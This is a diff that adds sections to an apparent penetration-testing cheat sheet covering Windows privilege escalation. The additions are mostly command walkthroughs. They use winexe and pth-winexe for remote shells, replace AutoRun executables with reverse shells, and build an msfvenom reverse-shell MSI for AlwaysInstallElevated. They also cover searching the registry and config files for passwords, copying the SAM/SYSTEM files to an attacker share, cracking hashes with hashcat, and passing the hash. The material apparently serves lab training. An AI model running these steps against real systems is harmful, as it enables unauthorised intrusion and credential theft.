@@ -63,6 +63,7 @@
   - [mslink](#mslink)
   - [Invoke PowerShellTcp ps1](#Invoke-PowerShellTcp-ps1)
   - [nishang](#nishang)
+  - [winexe](#winexe)
   - ------------------------------------------------------------------------------------
 ## 2. Pivoting Tunneling and Port Forwarding
 - [Pivoting Tunneling and Port Forwarding](#Pivoting-Tunneling-and-Port-Forwarding)
@@ -106,7 +107,17 @@
   - [Insecure Service Executables](#Insecure-Service-Executables)
   - [DLL Hijacking ](#DLL-Hijacking)
 - [Registry exploits](#Registry-exploits)
+  - [AutoRuns](#AutoRuns)
+  - [AlwaysInstallElevated REG](#AlwaysInstallElevated-REG)
 - [passwords](#passwords)
+  - [Registry](#Registry)
+  - [Searching the Registry for Passwords](#Searching-the-Registry-for-Passwords)
+  - [Saved Creds](#Saved-Creds)
+  - [Configuration Files](#Configuration-Files)
+  - [Searching for Configuration Files](#Searching-for-Configuration-Files)
+  - [SAM](#SAM)
+  - [SAM/SYSTEM Locations](#SAM/SYSTEM-Locations)
+  - [Passing the Hash](#Passing-the-Hash)
 - [scheduled tasks](#scheduled-tasks)
 - [insecure GUI apps](#insecure-GUI-apps)
 - [startup apps](#startup-apps)
@@ -929,6 +940,29 @@ Nishang is a framework and collection of scripts and payloads which enables usag
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 ```
 
+### winexe
+Winexe remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package).
+
+#### winexe Usage Example
+
+With the given credentials (-U ‘Administrator%s3cr3t’), connect to the remote server (//192.168.1.225), and execute the given command (cmd.exe /c echo “this is running on windows”):
+```
+root@kali:~# winexe -U 'Administrator%s3cr3t' //192.168.1.225 'cmd.exe /c echo "this is running on windows"'
+"this is running on windows"
+```
+#### example 2 
+```
+winexe -U 'admin%password123' //192.168.1.22 cmd.exe
+```
+if your a admin (or have admin creds etc) you can modify the command a bit and add 
+```
+--system
+```
+so for an example: 
+```
+# winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
+```
+to spawn a system shell
 -------------------------------------------------------------------------------------
 
 
@@ -1936,7 +1970,286 @@ listener on Kali and then stop/start the service to trigger the exploit:
 
 ### Registry exploits
 
+#### AutoRuns
+Windows can be configured to run commands at startup,
+with elevated privileges.
+
+These “AutoRuns” are configured in the Registry.
+If you are able to write to an AutoRun executable, and are
+able to restart the system (or wait for it to be restarted) you
+may be able to escalate privileges.
+
+  
+#### Privilege Escalation
+
+1. Use winPEAS to check for writable AutoRun executables:
+```
+> .\winPEASany.exe quiet applicationsinfo
+```
+2. Alternatively, we could manually enumerate the AutoRun executables:
+```
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+and then use accesschk.exe to verify the permissions on each one:
+```
+> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+```
+
+3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by
+Everyone. Create a backup of the original:
+```
+> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+```
+4. Copy our reverse shell executable to overwrite the AutoRun executable:
+```
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+```
+5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on
+Windows 10, the exploit appears to run with the privileges of the last logged on user, so log
+out of the “user” account and log in as the “admin” account first.
+
+#### AlwaysInstallElevated REG 
+MSI files are package files used to install applications.
+These files run with the permissions of the user trying to install
+them.
+
+Windows allows for these installers to be run with elevated (i.e.
+admin) privileges.
+
+If this is the case, we can generate a malicious MSI file which
+contains a reverse shell.
+
+The catch is that two Registry settings must be enabled for this to work.
+The “AlwaysInstallElevated” value must be set to 1 for both the local
+machine:
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+and the current user:
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+If either of these are missing or disabled, the exploit will not work.
+
+#### 1.Use winPEAS to see if both registry values are set:
+```
+> .\winPEASany.exe quiet windowscreds
+```
+2.Alternatively, verify the values manually:
+```
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+```
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+3.Create a new reverse shell with msfvenom, this time using the msi format,
+and save it with the .msi extension:
+```
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
+```
+4.Copy the reverse.msi across to the Windows VM, start a listener on Kali,
+and run the installer to trigger the exploit:
+```
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
+
 ### passwords
+#### Passwords?
+
+Yes, passwords.
+
+Even administrators re-use their passwords, or leave
+their passwords on systems in readable locations.
+Windows can be especially vulnerable to this, as several
+features of Windows store passwords insecurely.
+
+#### Registry
+Plenty of programs store configuration options in the
+Windows Registry.
+
+Windows itself sometimes will store passwords in
+plaintext in the Registry.
+
+It is always worth searching the Registry for passwords.
+
+#### Searching the Registry for Passwords
+The following commands will search the registry for keys and
+values that contain “password”
+```
+> reg query HKLM /f password /t REG_SZ /s
+```
+```
+> reg query HKCU /f password /t REG_SZ /s
+```
+This usually generates a lot of results, so often it is more
+fruitful to look in known locations.
+
+#### Privilege Escalation
+
+1.Use winPEAS to check common password locations:
+```
+> .\winPEASany.exe quiet filesinfo userinfo
+```
+(the final checks will take a long time to complete)
+2.The results show both AutoLogon credentials and Putty
+session credentials for the admin user
+(admin/password123).
+
+3.We can verify these manually:
+```
+> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+```
+```
+> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+```
+4.On Kali, we can use the winexe command to spawn a shell using these
+credentials:
+```
+# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
+```
+if your a admin (or have admin creds etc) you can modify the command a bit and add 
+```
+--system
+```
+so for an example: 
+```
+# winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
+```
+to spawn a system shell
+
+
+#### Saved Creds
+Windows has a runas command which allows users to run
+commands with the privileges of other users.
+This usually requires the knowledge of the other user’s
+password.
+
+However, Windows also allows users to save their credentials
+to the system, and these saved credentials can be used to
+bypass this requirement.
+
+#### Privilege Escalation
+1.Use winPEAS to check for saved credentials:
+```
+> .\winPEASany.exe quiet cmd windowscreds
+```
+2.It appears that saved credentials for the admin user exist.
+
+3.We can verify this manually using the following command:
+```
+> cmdkey /list
+```
+
+4.If the saved credentials aren’t present, run the following script to
+refresh the credential: (ops just in this lab/demo)
+```
+> C:\PrivEsc\savecred.bat
+```
+5.We can use the saved credential to run any command as the admin
+user. Start a listener on Kali and run the reverse shell executable:
+```
+> runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
+### Configuration Files
+Some administrators will leave configurations files on
+the system with passwords in them.
+
+The Unattend.xml file is an example of this.
+It allows for the largely automated setup of Windows
+systems.
+
+#### Searching for Configuration Files
+Recursively search for files in the current directory with
+“pass” in the name, or ending in “.config”:
+```
+> dir /s *pass* == *.config
+```
+Recursively search for files in the current directory that
+contain the word “password” and also end in either .xml, .ini,
+or .txt:
+```
+> findstr /si password *.xml *.ini *.txt
+```
+
+#### Privilege Escalation
+1. Use winPEAS to search for common files which may
+contain credentials:
+```
+> .\winPEASany.exe quiet cmd searchfast filesinfo
+```
+2. The Unattend.xml file was found. View the contents:
+```
+> type C:\Windows\Panther\Unattend.xml
+``` 
+3.A password for the admin user was found. The password
+is Base64 encoded: cGFzc3dvcmQxMjM=
+
+4.On Kali we can easily decode this:
+```
+# echo "cGFzc3dvcmQxMjM=" | base64 -d
+```
+5.Once again we can simply use winexe to spawn a shell as
+the admin user.
+
+### SAM
+Windows stores password hashes in the Security Account
+Manager (SAM).
+
+The hashes are encrypted with a key which can be found in a
+file named SYSTEM.
+
+If you have the ability to read the SAM and SYSTEM files, you
+can extract the hashes.
+
+#### SAM/SYSTEM Locations
+The SAM and SYSTEM files are located in the
+C:\Windows\System32\config directory.
+
+The files are locked while Windows is running.
+
+Backups of the files may exist in the C:\Windows\Repair
+or C:\Windows\System32\config\RegBack directories.
+
+#### Privilege Escalation
+1.Backups of the SAM and SYSTEM files can be found in
+C:\Windows\Repair and are readable by our user.
+
+2.Copy the files back to Kali:
+```
+> copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
+```
+```
+> copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
+```
+
+3.Download the latest version of the creddump suite:
+```
+# git clone https://github.com/Neohapsis/creddump7.git
+```
+4.Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
+```
+# python2 creddump7/pwdump.py SYSTEM SAM
+```
+5.Crack the admin user hash using hashcat:
+```
+# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+```
+
+### Passing the Hash
+Windows accepts hashes instead of passwords to
+authenticate to a number of services.
+
+We can use a modified version of winexe, pth-winexe to
+spawn a command prompt using the admin user’s hash.
+
+#### Privilege Escalation
+1.Extract the admin hash from the SAM in the previous step.
+2.Use the hash with pth-winexe to spawn a command prompt:
+```
+# pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+```
+3.Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
+```
+# pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+```
 
 ### scheduled tasks
 
@@ -2693,7 +3006,7 @@ C:\Windows\system32>whoami
 wprivesc1\taskusr1
 ```
 
-#### AlwaysInstallElevated'
+#### AlwaysInstallElevated
 
 Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
 
